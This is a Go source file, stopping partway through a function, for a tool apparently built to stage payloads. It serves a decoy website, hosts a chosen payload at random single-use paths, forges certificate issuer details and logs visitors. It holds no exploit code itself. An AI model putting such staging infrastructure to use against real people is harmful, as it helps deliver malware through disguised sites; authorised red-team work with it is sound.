package main

import (
	"bufio"
	"context"
	"crypto/ecdsa"
	"crypto/ed25519"
	"crypto/elliptic"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"text/tabwriter"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/gin-gonic/gin"
	"github.com/rivo/tview"
)

type CertConfig struct {
	Hosts              []string               `json:"hosts"`
	ValidFrom          string                 `json:"valid_from"`
	ValidForDays       int                    `json:"valid_for_days"`
	IsCA               bool                   `json:"is_ca"`
	KeyType            string                 `json:"key_type"`
	ECDSACurve         string                 `json:"ecdsa_curve"`
	RSABits            int                    `json:"rsa_bits"`
	Organization       string                 `json:"organization"`
	OrganizationalUnit string                 `json:"organizational_unit"`
	Country            string                 `json:"country"`
	Province           string                 `json:"province"`
	Locality           string                 `json:"locality"`
	CommonName         string                 `json:"common_name"`
	Issuer             *CertificateNameConfig `json:"issuer,omitempty"`
}

type CertificateNameConfig struct {
	Organization       string `json:"organization"`
	OrganizationalUnit string `json:"organizational_unit"`
	Country            string `json:"country"`
	Province           string `json:"province"`
	Locality           string `json:"locality"`
	CommonName         string `json:"common_name"`
}

type CertProfileConfig struct {
	DefaultProfile string                `json:"default_profile"`
	Profiles       map[string]CertConfig `json:"profiles"`
}

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

const defaultSitePath = "assets/site1"
const defaultStageOptionsDir = "stage_options"
const defaultPayloadOptionsDir = "payload_options"

var (
	buildVersion = "dev"
	buildCommit  = "unknown"
	buildDate    = "unknown"
	buildTarget  = runtime.GOOS + "/" + runtime.GOARCH
)

type HeaderConfig map[string]string

type HeaderProfileConfig struct {
	DefaultProfile string                  `json:"default_profile"`
	Profiles       map[string]HeaderConfig `json:"profiles"`
}

type PayloadMatch struct {
	FilePath    string
	ExpiredPath string
	NewPath     string
}

type PayloadManager struct {
	mu               sync.Mutex
	filePath         string
	currentPath      string
	maxDownloads     int
	pathDownloads    int
	generateNextPath func() string
}

type AccessLogEntry struct {
	Timestamp string  `json:"timestamp"`
	ClientIP  string  `json:"client_ip"`
	UserAgent string  `json:"user_agent"`
	Method    string  `json:"method"`
	Path      string  `json:"path"`
	Status    int     `json:"status"`
	LatencyMS float64 `json:"latency_ms"`
	Errors    string  `json:"errors,omitempty"`
}

type AccessLogger struct {
	mu         sync.Mutex
	writer     io.Writer
	jsonFormat bool
	observers  []AccessLogObserver
}

type RuntimeLogs struct {
	files            []*os.File
	ginWriter        io.Writer
	accessMiddleware gin.HandlerFunc
}

type AccessLogObserver func(AccessLogEntry)

type CertificateInfo struct {
	SelfSigned bool
	LocalCA    bool
}

type DownloadCommandOptions struct {
	URL            string
	OutputFile     string
	MaxDownloads   int
	SelfSignedCert bool
	LocalCACert    bool
}

type DownloadCommand struct {
	Label   string
	Command string
}

type AppConfig struct {
	SitePath            string
	PayloadFile         string
	PayloadMaxDownloads int
	DownloadHost        string
	DownloadPort        int
	OutputName          string
	HTTPAddr            string
	HTTPSAddr           string
	CertConfigPath      string
	CertProfile         string
	HeaderConfigPath    string
	HeaderProfile       string
	LogDir              string
	NoAccessLog         bool
	JSONLogs            bool
}

type RuntimeStartOptions struct {
	PrintStartup            bool
	PrintPayloadCommands    bool
	MirrorAccessLogToStdout bool
	AccessObservers         []AccessLogObserver
}

type AppRuntime struct {
	Config          AppConfig
	CertProfile     string
	HeaderProfile   string
	DownloadBaseURL string
	CertInfo        CertificateInfo
	Payload         *PayloadRuntime
	Logs            *RuntimeLogs
	WebServers      *WebServers
}

type StartupPlan struct {
	Config            AppConfig
	CertConfig        *CertConfig
	CertProfile       string
	HeaderConfig      HeaderConfig
	HeaderProfile     string
	HeaderWarning     error
	DownloadPort      int
	DownloadBaseURL   string
	PayloadOutputFile string
	PayloadURLShape   string
}

type PayloadRuntime struct {
	mu      sync.Mutex
	Manager *PayloadManager
	Options DownloadCommandOptions
}

type WebServers struct {
	httpServer  *http.Server
	httpsServer *http.Server
	errors      chan error
}

type DashboardSnapshot struct {
	Total        int
	Success      int
	NotFound     int
	ServerErrors int
	LastRequest  string
	Recent       []AccessLogEntry
}

type DashboardRequestFilter string

const (
	requestFilterAll      DashboardRequestFilter = "all"
	requestFilterSuccess  DashboardRequestFilter = "success"
	requestFilterNotFound DashboardRequestFilter = "404"
	requestFilterErrors   DashboardRequestFilter = "errors"
)

type AccessEventBuffer struct {
	mu           sync.Mutex
	limit        int
	total        int
	success      int
	notFound     int
	serverErrors int
	lastRequest  string
	recent       []AccessLogEntry
}

func loadHeaderConfig(path string, profileName string) (HeaderConfig, string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, "", err
	}

	var profileConfig HeaderProfileConfig
	if err := json.Unmarshal(data, &profileConfig); err == nil && (profileConfig.DefaultProfile != "" || profileConfig.Profiles != nil) {
		return selectHeaderProfile(profileConfig, profileName)
	}

	var headers HeaderConfig
	err = json.Unmarshal(data, &headers)
	if err != nil {
		return nil, "", err
	}
	if profileName != "" {
		return nil, "", fmt.Errorf("header profile %q was requested, but %s does not define profiles", profileName, path)
	}

	return headers, "", nil
}

func selectHeaderProfile(config HeaderProfileConfig, profileName string) (HeaderConfig, string, error) {
	if len(config.Profiles) == 0 {
		return nil, "", fmt.Errorf("headers config defines profiles but none were provided")
	}

	selectedProfile := profileName
	if selectedProfile == "" {
		selectedProfile = config.DefaultProfile
	}
	if selectedProfile == "" {
		return nil, "", fmt.Errorf("headers config defines profiles but no default_profile was set")
	}

	headers, ok := config.Profiles[selectedProfile]
	if !ok {
		return nil, "", fmt.Errorf("unknown header profile %q; available profiles: %s", selectedProfile, availableHeaderProfiles(config.Profiles))
	}

	return headers, selectedProfile, nil
}

func availableHeaderProfiles(profiles map[string]HeaderConfig) string {
	names := make([]string, 0, len(profiles))
	for name := range profiles {
		names = append(names, name)
	}
	sort.Strings(names)
	return fmt.Sprintf("%v", names)
}

func main() {
	config := AppConfig{}
	flag.StringVar(&config.SitePath, "site", defaultSitePath, "Path to the fake site directory")
	flag.StringVar(&config.PayloadFile, "serve", "", "Path to file to serve at randomized path")
	flag.IntVar(&config.PayloadMaxDownloads, "payload-max-downloads", 1, "Downloads allowed per generated payload path; use 0 to keep one persistent path")
	flag.StringVar(&config.DownloadHost, "download-host", "", "Host/IP used in printed download URLs; defaults to the first certificate host")
	flag.IntVar(&config.DownloadPort, "download-port", 0, "HTTPS port used in printed download URLs; defaults to the port from --https-addr")
	flag.StringVar(&config.OutputName, "output-name", "", "Output filename used in printed download commands; defaults to the served file basename")
	flag.StringVar(&config.HTTPAddr, "http-addr", ":80", "HTTP listen address")
	flag.StringVar(&config.HTTPSAddr, "https-addr", ":443", "HTTPS listen address")
	flag.StringVar(&config.CertConfigPath, "cert-config", "cert_config.json", "Path to JSON config for certificate")
	flag.StringVar(&config.CertProfile, "cert-profile", "", "Certificate profile to select when the certificate config defines profiles")
	flag.StringVar(&config.HeaderConfigPath, "headers", "headers.json", "Path to JSON config for HTTP headers")
	flag.StringVar(&config.HeaderProfile, "header-profile", "", "Header profile to select when the headers config defines profiles")
	flag.StringVar(&config.LogDir, "log-dir", ".", "Directory for runtime logs")
	flag.BoolVar(&config.NoAccessLog, "no-access-log", false, "Disable request access logging")
	flag.BoolVar(&config.JSONLogs, "json-logs", false, "Write access log entries as JSON lines")
	tuiMode := flag.Bool("tui", false, "Open an interactive terminal setup screen before starting")
	dryRun := flag.Bool("dry-run", false, "Validate configuration and print the planned startup summary without binding ports")
	versionMode := flag.Bool("version", false, "Print version and build metadata, then exit")
	flag.Usage = func() {
		printFlagUsage(flag.CommandLine)
	}
	flag.Parse()

	if *versionMode {
		printBuildInfo()
		return
	}

	if *tuiMode {
		selectedConfig, start, err := runConfigTUI(config)
		if err != nil {
			log.Fatal(err)
		}
		if !start {
			fmt.Println("[+] Startup cancelled.")
			return
		}
		config = selectedConfig
		if *dryRun {
			if err := runDryRun(config); err != nil {
				log.Printf("[!] %v", err)
				os.Exit(1)
			}
			return
		}
		if err := runServerDashboard(config); err != nil {
			log.Printf("[!] %v", err)
			os.Exit(1)
		}
		return
	}

	if *dryRun {
		if err := runDryRun(config); err != nil {
			log.Printf("[!] %v", err)
			os.Exit(1)
		}
		return
	}

	if err := runServer(config); err != nil {
		log.Printf("[!] %v", err)
		os.Exit(1)
	}
}

func printBuildInfo() {
	fmt.Printf("catsonbroadway %s\n", buildVersion)
	fmt.Printf("commit: %s\n", buildCommit)
	fmt.Printf("built: %s\n", buildDate)
	fmt.Printf("target: %s\n", buildTarget)
}

func printFlagUsage(flagSet *flag.FlagSet) {
	output := flagSet.Output()
	fmt.Fprintf(output, "Usage of %s:\n", os.Args[0])

	writer := tabwriter.NewWriter(output, 0, 0, 2, ' ', 0)
	flagSet.VisitAll(func(f *flag.Flag) {
		valueName, usage := flag.UnquoteUsage(f)
		flagText := "--" + f.Name
		if valueName != "" {
			flagText += " " + valueName
		}
		if f.DefValue != "" && f.DefValue != "false" {
			usage += fmt.Sprintf(" (default %q)", f.DefValue)
		}
		fmt.Fprintf(writer, "  %s\t%s\n", flagText, usage)
	})
	writer.Flush()
}

func runDryRun(config AppConfig) error {
	plan, err := prepareStartupPlan(config)
	if err != nil {
		return err
	}
	printStartupSummary(plan, true)
	return nil
}

func runServer(appConfig AppConfig) error {
	runtime, err := startAppRuntime(appConfig, RuntimeStartOptions{
		PrintStartup:            true,
		PrintPayloadCommands:    true,
		MirrorAccessLogToStdout: true,
	})
	if err != nil {
		return err
	}
	defer runtime.Close()

	stopRequested := make(chan struct{})
	var stopOnce sync.Once
	startConsoleCommandLoop(func() {
		stopOnce.Do(func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			if err := runtime.Shutdown(ctx); err != nil {
				log.Printf("[!] Shutdown error: %v", err)
			}
			close(stopRequested)
		})
	})

	select {
	case err := <-runtime.Errors():
		return err
	case <-stopRequested:
		return nil
	}
}

func prepareStartupPlan(appConfig AppConfig) (*StartupPlan, error) {
	if appConfig.PayloadMaxDownloads < 0 {
		return nil, fmt.Errorf("--payload-max-downloads must be 0 or greater")
	}

	certConfig, selectedCertProfile, err := loadCertConfig(appConfig.CertConfigPath, appConfig.CertProfile)
	if err != nil {
		return nil, fmt.Errorf("certificate config: %w", err)
	}

	downloadPort, err := effectiveDownloadPort(appConfig)
	if err != nil {
		return nil, err
	}

	downloadBaseURL, err := buildDownloadBaseURL(appConfig.DownloadHost, downloadPort, certConfig.Hosts)
	if err != nil {
		return nil, err
	}

	if err := validateSitePath(appConfig.SitePath); err != nil {
		return nil, err
	}

	var payloadOutputFile string
	var payloadURLShape string
	if appConfig.PayloadFile != "" {
		if err := validatePayloadFile(appConfig.PayloadFile); err != nil {
			return nil, err
		}
		payloadOutputFile = payloadOutputName(appConfig.PayloadFile, appConfig.OutputName)
		payloadURLShape = buildPayloadURL(downloadBaseURL, "<random>/<random>")
	}

	headers, selectedHeaderProfile, headerErr := loadHeaderConfig(appConfig.HeaderConfigPath, appConfig.HeaderProfile)
	if headerErr != nil && appConfig.HeaderProfile != "" {
		return nil, fmt.Errorf("headers config: %w", headerErr)
	}
	if headerErr != nil {
		headers = nil
		selectedHeaderProfile = ""
	}

	return &StartupPlan{
		Config:            appConfig,
		CertConfig:        certConfig,
		CertProfile:       selectedCertProfile,
		HeaderConfig:      headers,
		HeaderProfile:     selectedHeaderProfile,
		HeaderWarning:     headerErr,
		DownloadPort:      downloadPort,
		DownloadBaseURL:   downloadBaseURL,
		PayloadOutputFile: payloadOutputFile,
		PayloadURLShape:   payloadURLShape,
	}, nil
}

func printStartupSummary(plan *StartupPlan, dryRun bool) {
	title := "Startup Summary"
	if dryRun {
		title = "Dry Run Summary"
	}

	fmt.Printf("[%s]\n", title)
	fmt.Printf("Version: %s (%s, %s, %s)\n", buildVersion, buildCommit, buildDate, buildTarget)
	fmt.Printf("Site: %s\n", plan.Config.SitePath)
	if plan.Config.PayloadFile == "" {
		fmt.Println("Payload: (none)")
	} else {
		fmt.Printf("Payload: %s\n", plan.Config.PayloadFile)
		fmt.Printf("Payload output: %s\n", plan.PayloadOutputFile)
		fmt.Printf("Payload policy: %s\n", payloadPolicyText(plan.Config.PayloadMaxDownloads))
		fmt.Printf("Payload URL shape: %s\n", plan.PayloadURLShape)
	}
	certificateMode := "generated self-signed"
	if plan.CertConfig.Issuer != nil {
		certificateMode = "generated local CA (not trusted by default)"
	}
	fmt.Printf("Certificate mode: %s -> cert.pem/key.pem\n", certificateMode)
	fmt.Printf("Certificate profile: %s\n", displayValue(plan.CertProfile, "flat config"))
	if plan.HeaderWarning != nil {
		fmt.Printf("Header profile: unavailable (%v)\n", plan.HeaderWarning)
	} else {
		fmt.Printf("Header profile: %s\n", displayValue(plan.HeaderProfile, "flat config"))
	}
	fmt.Printf("HTTP address: %s\n", plan.Config.HTTPAddr)
	fmt.Printf("HTTPS address: %s\n", plan.Config.HTTPSAddr)
	fmt.Printf("Download base URL: %s\n", plan.DownloadBaseURL)
	fmt.Printf("Log directory: %s\n", plan.Config.LogDir)
	fmt.Printf("Access log: %s\n", accessLogSummary(plan.Config))
	if dryRun {
		fmt.Println("Result: validation passed; no listeners were started and no certificate files were written.")
	}
	fmt.Println("")
}

func accessLogSummary(config AppConfig) string {
	if config.NoAccessLog {
		return "disabled"
	}
	if config.JSONLogs {
		return "enabled, JSON lines"
	}
	return "enabled, text"
}

func startAppRuntime(appConfig AppConfig, options RuntimeStartOptions) (*AppRuntime, error) {
	plan, err := prepareStartupPlan(appConfig)
	if err != nil {
		return nil, err
	}
	if options.PrintStartup {
		printStartupSummary(plan, false)
	}

	certInfo, err := generateCertificate(plan.CertConfig)
	if err != nil {
		return nil, err
	}

	runtimeLogs, err := setupRuntimeLogsWithOptions(
		appConfig.LogDir,
		appConfig.NoAccessLog,
		appConfig.JSONLogs,
		options.MirrorAccessLogToStdout,
		options.AccessObservers...,
	)
	if err != nil {
		return nil, err
	}
	cleanupLogs := true
	defer func() {
		if cleanupLogs {
			runtimeLogs.Close()
		}
	}()

	gin.DefaultWriter = runtimeLogs.ginWriter
	r := gin.New()
	r.Use(gin.RecoveryWithWriter(runtimeLogs.ginWriter))
	if runtimeLogs.accessMiddleware != nil {
		r.Use(runtimeLogs.accessMiddleware)
	}

	// Load custom headers from config
	if plan.HeaderWarning != nil {
		log.Printf("[!] Failed to load headers from %s: %v", appConfig.HeaderConfigPath, plan.HeaderWarning)
	} else if plan.HeaderConfig != nil {
		r.Use(func(c *gin.Context) {
			for key, value := range plan.HeaderConfig {
				c.Writer.Header().Set(key, value)
			}
		})
	}

	// Load dynamic site assets
	if err := validateSitePath(appConfig.SitePath); err != nil {
		return nil, err
	}
	htmlGlob := filepath.Join(appConfig.SitePath, "*.html")
	r.LoadHTMLGlob(htmlGlob)
	r.Static("/css", filepath.Join(appConfig.SitePath, "css"))
	r.Static("/js", filepath.Join(appConfig.SitePath, "js"))
	r.Static("/assets", filepath.Join(appConfig.SitePath, "assets"))

	r.GET("/", func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", nil)
	})

	// Payload serving can be enabled, disabled, or swapped while the TUI is running.
	payloadManager := newPayloadManager(appConfig.PayloadFile, appConfig.PayloadMaxDownloads, randomPayloadPath)
	payloadRuntime := &PayloadRuntime{
		Manager: payloadManager,
		Options: DownloadCommandOptions{
			OutputFile:     payloadOutputName(appConfig.PayloadFile, appConfig.OutputName),
			MaxDownloads:   appConfig.PayloadMaxDownloads,
			SelfSignedCert: certInfo.SelfSigned,
			LocalCACert:    certInfo.LocalCA,
		},
	}
	if appConfig.PayloadFile != "" {
		if options.PrintPayloadCommands {
			printPayloadCommands(payloadRuntime.CurrentCommandOptions(plan.DownloadBaseURL))
		}
	}

	r.NoRoute(func(c *gin.Context) {
		if c.Request.Method != http.MethodGet {
			c.AbortWithStatus(http.StatusNotFound)
			return
		}

		match, ok := payloadManager.Match(c.Request.URL.Path)
		if !ok {
			c.AbortWithStatus(http.StatusNotFound)
			return
		}

		c.File(match.FilePath)
		if match.ExpiredPath != "" {
			if options.PrintPayloadCommands {
				fmt.Printf("[-] Path expired: %s\n", match.ExpiredPath)
				printPayloadCommands(payloadRuntime.CurrentCommandOptions(plan.DownloadBaseURL))
			}
		}
	})

	webServers, err := startWebServers(r, appConfig.HTTPAddr, appConfig.HTTPSAddr, "cert.pem", "key.pem")
	if err != nil {
		return nil, err
	}

	if options.PrintStartup {
		fmt.Printf("[+] HTTP listening on %s\n", appConfig.HTTPAddr)
		fmt.Printf("[+] HTTPS listening on %s\n", appConfig.HTTPSAddr)
	}

	cleanupLogs = false
	return &AppRuntime{
		Config:          appConfig,
		CertProfile:     plan.CertProfile,
		HeaderProfile:   plan.HeaderProfile,
		DownloadBaseURL: plan.DownloadBaseURL,
		CertInfo:        certInfo,
		Payload:         payloadRuntime,
		Logs:            runtimeLogs,
		WebServers:      webServers,
	}, nil
}

func effectiveDownloadPort(config AppConfig) (int, error) {
	if config.DownloadPort != 0 {
		if config.DownloadPort < 0 || config.DownloadPort > 65535 {
			return 0, fmt.Errorf("--download-port must be between 1 and 65535")
		}
		return config.DownloadPort, nil
	}

	port, err := portFromListenAddr(config.HTTPSAddr)
	if err != nil {
		return 0, fmt.Errorf("--download-port was not set and --https-addr %q does not include a valid port: %w", config.HTTPSAddr, err)
	}
	return port, nil
}

func validateAppConfig(config AppConfig) error {
	if config.PayloadMaxDownloads < 0 {
		return fmt.Errorf("--payload-max-downloads must be 0 or greater")
	}

	certConfig, _, err := loadCertConfig(config.CertConfigPath, config.CertProfile)
	if err != nil {
		return fmt.Errorf("certificate config: %w", err)
	}

	downloadPort, err := effectiveDownloadPort(config)
	if err != nil {
		return err
	}
	if _, err := buildDownloadBaseURL(config.DownloadHost, downloadPort, certConfig.Hosts); err != nil {
		return err
	}

	if err := validateSitePath(config.SitePath); err != nil {
		return err
	}

	if config.PayloadFile != "" {
		if err := validatePayloadFile(config.PayloadFile); err != nil {
			return err
		}
	}

	if _, _, err := loadHeaderConfig(config.HeaderConfigPath, config.HeaderProfile); err != nil && config.HeaderProfile != "" {
		return fmt.Errorf("headers config: %w", err)
	}

	return nil
}

type tuiFormState struct {
	payloadMaxDownloads *tview.InputField
	downloadHost        *tview.InputField
	downloadPort        *tview.InputField
	outputName          *tview.InputField
	httpAddr            *tview.InputField
	httpsAddr           *tview.InputField
	certConfigPath      *tview.InputField
	headerConfigPath    *tview.InputField
	logDir              *tview.InputField
	noAccessLog         *tview.Checkbox
	jsonLogs            *tview.Checkbox
	sitePath            string
	payloadFile         string
	certProfile         string
	headerProfile       string
}

type profileOption struct {
	Label string
	Value string
}

func runConfigTUI(config AppConfig) (AppConfig, bool, error) {
	app := tview.NewApplication()
	form := tview.NewForm()
	form.SetBorder(true).SetTitle(" catsonbroadway setup ")
	form.SetBorderColor(tcell.ColorAqua)
	form.SetTitleColor(tcell.ColorAqua)
	form.SetButtonsAlign(tview.AlignRight)

	state := &tuiFormState{
		payloadMaxDownloads: newTUIInputField("Payload max downloads", strconv.Itoa(config.PayloadMaxDownloads)),
		downloadHost:        newTUIInputField("Download host", config.DownloadHost),
		downloadPort:        newTUIInputField("Download port", tuiPortText(config.DownloadPort)),
		outputName:          newTUIInputField("Output name", config.OutputName),
		httpAddr:            newTUIInputField("HTTP listen", config.HTTPAddr),
		httpsAddr:           newTUIInputField("HTTPS listen", config.HTTPSAddr),
		certConfigPath:      newTUIInputField("Cert config", config.CertConfigPath),
		headerConfigPath:    newTUIInputField("Headers config", config.HeaderConfigPath),
		logDir:              newTUIInputField("Log dir", config.LogDir),
		noAccessLog:         tview.NewCheckbox().SetLabel("No access log").SetChecked(config.NoAccessLog),
		jsonLogs:            tview.NewCheckbox().SetLabel("JSON access log").SetChecked(config.JSONLogs),
	}

	siteOptions, siteIndex, selectedSitePath, siteErr := sitePathOptions(defaultStageOptionsDir, config.SitePath)
	payloadOptions, payloadIndex, selectedPayloadFile, payloadErr := payloadFileOptions(defaultPayloadOptionsDir, config.PayloadFile)
	certOptions, certIndex, selectedCertProfile, certErr := certProfileOptions(config.CertConfigPath, config.CertProfile)
	headerOptions, headerIndex, selectedHeaderProfile, headerErr := headerProfileOptions(config.HeaderConfigPath, config.HeaderProfile)
	state.sitePath = selectedSitePath
	state.payloadFile = selectedPayloadFile
	state.certProfile = selectedCertProfile
	state.headerProfile = selectedHeaderProfile

	form.AddFormItem(newTUIDropDown("Site", siteOptions, siteIndex, func(value string) {
		state.sitePath = value
	}))
	form.AddFormItem(newTUIDropDown("Payload", payloadOptions, payloadIndex, func(value string) {
		state.payloadFile = value
	}))
	form.AddFormItem(state.payloadMaxDownloads)
	form.AddFormItem(state.httpAddr)
	form.AddFormItem(state.httpsAddr)
	form.AddFormItem(state.certConfigPath)
	form.AddFormItem(newTUIDropDown("Cert profile", certOptions, certIndex, func(value string) {
		state.certProfile = value
	}))
	form.AddFormItem(state.headerConfigPath)
	form.AddFormItem(newTUIDropDown("Header profile", headerOptions, headerIndex, func(value string) {
		state.headerProfile = value
	}))
	form.AddFormItem(state.downloadHost)
	form.AddFormItem(state.downloadPort)
	form.AddFormItem(state.outputName)
	form.AddFormItem(state.logDir)
	form.AddFormItem(state.noAccessLog)
	form.AddFormItem(state.jsonLogs)

	root := tview.NewFlex().SetDirection(tview.FlexRow)
	if siteErr != nil || payloadErr != nil || certErr != nil || headerErr != nil {
		warnings := strings.Join(tuiMetadataWarnings(siteErr, payloadErr, certErr, headerErr), "\n")
		root.AddItem(tview.NewTextView().SetDynamicColors(true).SetText(warnings), len(strings.Split(warnings, "\n"))+1, 0, false)
	}
	root.AddItem(form, 0, 1, true)

	selectedConfig := config
	start := false
	form.AddButton("Validate", func() {
		candidate, err := state.AppConfig(config)
		if err == nil {
			err = validateAppConfig(candidate)
		}
		if err != nil {
			showTUIModal(app, root, "Preflight failed:\n\n"+err.Error())
			return
		}
		showTUIModal(app, root, tuiPreflightSummary(candidate))
	})
	form.AddButton("Start", func() {
		candidate, err := state.AppConfig(config)
		if err == nil {
			err = validateAppConfig(candidate)
		}
		if err != nil {
			showTUIModal(app, root, "Preflight failed:\n\n"+err.Error())
			return
		}
		selectedConfig = candidate
		start = true
		app.Stop()
	})
	form.AddButton("Cancel", func() {
		app.Stop()
	})

	if err := app.SetRoot(root, true).EnableMouse(true).Run(); err != nil {
		return config, false, err
	}
	return selectedConfig, start, nil
}

func newTUIInputField(label string, value string) *tview.InputField {
	return tview.NewInputField().
		SetLabel(label).
		SetText(value).
		SetFieldWidth(48)
}

func tuiPortText(port int) string {
	if port == 0 {
		return ""
	}
	return strconv.Itoa(port)
}

func (s *tuiFormState) AppConfig(defaults AppConfig) (AppConfig, error) {
	config := defaults
	config.SitePath = strings.TrimSpace(s.sitePath)
	config.PayloadFile = strings.TrimSpace(s.payloadFile)
	config.DownloadHost = strings.TrimSpace(s.downloadHost.GetText())
	config.OutputName = strings.TrimSpace(s.outputName.GetText())
	config.HTTPAddr = strings.TrimSpace(s.httpAddr.GetText())
	config.HTTPSAddr = strings.TrimSpace(s.httpsAddr.GetText())
	config.CertConfigPath = strings.TrimSpace(s.certConfigPath.GetText())
	config.CertProfile = s.certProfile
	config.HeaderConfigPath = strings.TrimSpace(s.headerConfigPath.GetText())
	config.HeaderProfile = s.headerProfile
	config.LogDir = strings.TrimSpace(s.logDir.GetText())
	config.NoAccessLog = s.noAccessLog.IsChecked()
	config.JSONLogs = s.jsonLogs.IsChecked()

	payloadMaxDownloads, err := strconv.Atoi(strings.TrimSpace(s.payloadMaxDownloads.GetText()))
	if err != nil {
		return config, fmt.Errorf("--payload-max-downloads must be a whole number")
	}
	config.PayloadMaxDownloads = payloadMaxDownloads

	downloadPortText := strings.TrimSpace(s.downloadPort.GetText())
	config.DownloadPort = 0
	if downloadPortText != "" {
		downloadPort, err := strconv.Atoi(downloadPortText)
		if err != nil {
			return config, fmt.Errorf("--download-port must be a whole number")
		}
		config.DownloadPort = downloadPort
	}

	return config, nil
}

func newTUIDropDown(label string, options []profileOption, currentIndex int, onSelect func(string)) *tview.DropDown {
	labels := make([]string, 0, len(options))
	for _, option := range options {
		labels = append(labels, option.Label)
	}
	if len(labels) == 0 {
		options = []profileOption{{Label: "(default)", Value: ""}}
		labels = []string{"(default)"}
		currentIndex = 0
	}
	if currentIndex < 0 || currentIndex >= len(labels) {
		currentIndex = 0
	}

	onSelect(options[currentIndex].Value)
	return tview.NewDropDown().
		SetLabel(label).
		SetOptions(labels, func(_ string, index int) {
			if index >= 0 && index < len(options) {
				onSelect(options[index].Value)
			}
		}).
		SetCurrentOption(currentIndex)
}

func sitePathOptions(stageOptionsDir string, preferred string) ([]profileOption, int, string, error) {
	paths, err := listStageSitePaths(stageOptionsDir)
	options, selectedIndex, selectedValue := buildSiteOptions(paths, preferred)
	return options, selectedIndex, selectedValue, err
}

func listStageSitePaths(stageOptionsDir string) ([]string, error) {
	entries, err := os.ReadDir(stageOptionsDir)
	if err != nil {
		return nil, err
	}

	paths := make([]string, 0, len(entries))
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		paths = append(paths, filepath.ToSlash(filepath.Join(stageOptionsDir, entry.Name())))
	}
	sort.Strings(paths)
	return paths, nil
}

func buildSiteOptions(paths []string, preferred string) ([]profileOption, int, string) {
	preferred = strings.TrimSpace(preferred)
	if len(paths) == 0 {
		if preferred == "" {
			preferred = defaultSitePath
		}
		return []profileOption{{Label: preferred + " (current)", Value: preferred}}, 0, preferred
	}

	selected := preferred
	if selected == "" || samePathOption(selected, defaultSitePath) {
		selected = paths[0]
	}

	options := make([]profileOption, 0, len(paths)+1)
	selectedIndex := 0
	selectedValue := paths[0]
	foundSelected := false
	for _, path := range paths {
		if samePathOption(path, selected) {
			selectedIndex = len(options)
			selectedValue = path
			foundSelected = true
		}
		options = append(options, profileOption{
			Label: filepath.Base(path),
			Value: path,
		})
	}

	if !foundSelected && selected != "" {
		options = append([]profileOption{{Label: selected + " (current)", Value: selected}}, options...)
		selectedIndex = 0
		selectedValue = selected
	}

	return options, selectedIndex, selectedValue
}

func samePathOption(left string, right string) bool {
	return filepath.ToSlash(filepath.Clean(left)) == filepath.ToSlash(filepath.Clean(right))
}

func payloadFileOptions(payloadOptionsDir string, preferred string) ([]profileOption, int, string, error) {
	paths, err := listPayloadOptionFiles(payloadOptionsDir)
	options, selectedIndex, selectedValue := buildPayloadOptions(paths, preferred)
	return options, selectedIndex, selectedValue, err
}

func listPayloadOptionFiles(payloadOptionsDir string) ([]string, error) {
	var paths []string
	err := filepath.WalkDir(payloadOptionsDir, func(path string, entry fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		if entry.IsDir() {
			return nil
		}
		paths = append(paths, filepath.ToSlash(path))
		return nil
	})
	if err != nil {
		return nil, err
	}
	sort.Strings(paths)
	return paths, nil
}

func buildPayloadOptions(paths []string, preferred string) ([]profileOption, int, string) {
	preferred = strings.TrimSpace(preferred)
	options := []profileOption{{Label: "(none)", Value: ""}}
	selectedIndex := 0
	selectedValue := ""
	foundSelected := preferred == ""

	for _, path := range paths {
		label := payloadOptionLabel(path)
		if samePathOption(path, preferred) {
			selectedIndex = len(options)
			selectedValue = path
			foundSelected = true
		}
		options = append(options, profileOption{
			Label: label,
			Value: path,
		})
	}

	if !foundSelected && preferred != "" {
		options = append([]profileOption{{Label: preferred + " (current)", Value: preferred}}, options...)
		selectedIndex = 0
		selectedValue = preferred
	}

	return options, selectedIndex, selectedValue
}

func payloadOptionLabel(path string) string {
	relPath, err := filepath.Rel(defaultPayloadOptionsDir, path)
	if err == nil && relPath != "." && !strings.HasPrefix(relPath, "..") {
		return filepath.ToSlash(relPath)
	}
	return filepath.Base(path)
}

func certProfileOptions(path string, preferred string) ([]profileOption, int, string, error) {
	names, defaultProfile, err := loadCertProfileNames(path)
	options, selectedIndex, selectedValue := buildProfileOptions(names, defaultProfile, preferred)
	return options, selectedIndex, selectedValue, err
}

func headerProfileOptions(path string, preferred string) ([]profileOption, int, string, error) {
	names, defaultProfile, err := loadHeaderProfileNames(path)
	options, selectedIndex, selectedValue := buildProfileOptions(names, defaultProfile, preferred)
	return options, selectedIndex, selectedValue, err
}

func loadCertProfileNames(path string) ([]string, string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, "", err
	}

	var config CertProfileConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, "", err
	}
	if config.DefaultProfile == "" && config.Profiles == nil {
		return nil, "", nil
	}

	names := make([]string, 0, len(config.Profiles))
	for name := range config.Profiles {
		names = append(names, name)
	}
	sort.Strings(names)
	return names, config.DefaultProfile, nil
}

func loadHeaderProfileNames(path string) ([]string, string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, "", err
	}

	var config HeaderProfileConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, "", err
	}
	if config.DefaultProfile == "" && config.Profiles == nil {
		return nil, "", nil
	}

	names := make([]string, 0, len(config.Profiles))
	for name := range config.Profiles {
		names = append(names, name)
	}
	sort.Strings(names)
	return names, config.DefaultProfile, nil
}

func buildProfileOptions(names []string, defaultProfile string, preferred string) ([]profileOption, int, string) {
	if len(names) == 0 {
		options := []profileOption{{Label: "(config default or flat config)", Value: ""}}
		if preferred != "" {
			options = append([]profileOption{{Label: preferred + " (requested)", Value: preferred}}, options...)
			return options, 0, preferred
		}
